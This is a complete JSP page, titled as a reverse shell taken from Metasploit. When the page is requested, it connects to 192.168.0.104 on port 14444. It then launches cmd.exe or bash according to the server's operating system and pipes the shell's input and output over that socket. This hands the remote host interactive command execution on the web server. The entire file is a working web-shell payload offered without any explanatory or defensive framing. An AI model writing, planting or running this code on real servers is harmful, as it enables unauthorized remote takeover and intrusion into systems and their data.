<%@ page language="java" contentType="text/html; charset=UTF-8"
	import="java.util.*" import="java.io.*" import="java.net.*"
	pageEncoding="UTF-8"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>reverse_shell from msf</title>
</head>
<body>
	<%
		class StreamConnector extends Thread {
			InputStream is;
			OutputStream os;

			StreamConnector(InputStream is, OutputStream os) {
				this.is = is;
				this.os = os;
			}

			public void run() {
				BufferedReader in = null;
				BufferedWriter out = null;
				try {
					in = new BufferedReader(new InputStreamReader(this.is));
					out = new BufferedWriter(
							new OutputStreamWriter(this.os));
					char buffer[] = new char[8 * 1024];
					int length;
					while ((length = in.read(buffer, 0, buffer.length)) > 0) {
						out.write(buffer, 0, length);
						out.flush();
					}
				} catch (Exception e) {
				}
				try {
					if (in != null)
						in.close();
					if (out != null)
						out.close();
				} catch (Exception e) {
				}
			}
		}
		try {
			Socket socket = new Socket("192.168.0.104", 14444);

			String osName = System.getProperty("os.name");
			Process process = null;
			if (osName.toLowerCase().indexOf("win") >= 0) {
				process = Runtime.getRuntime().exec("cmd.exe");
			} else {
				process = Runtime.getRuntime().exec("bash");
			}

			(new StreamConnector(process.getInputStream(),
					socket.getOutputStream())).start();
			(new StreamConnector(process.getErrorStream(),
					socket.getOutputStream())).start();
			(new StreamConnector(socket.getInputStream(),
					process.getOutputStream())).start();

			out.println("reverse succeed. just try to type something.");

		} catch (Exception e) {
			out.println(e.getMessage());
		}
	%>

</body>
</html>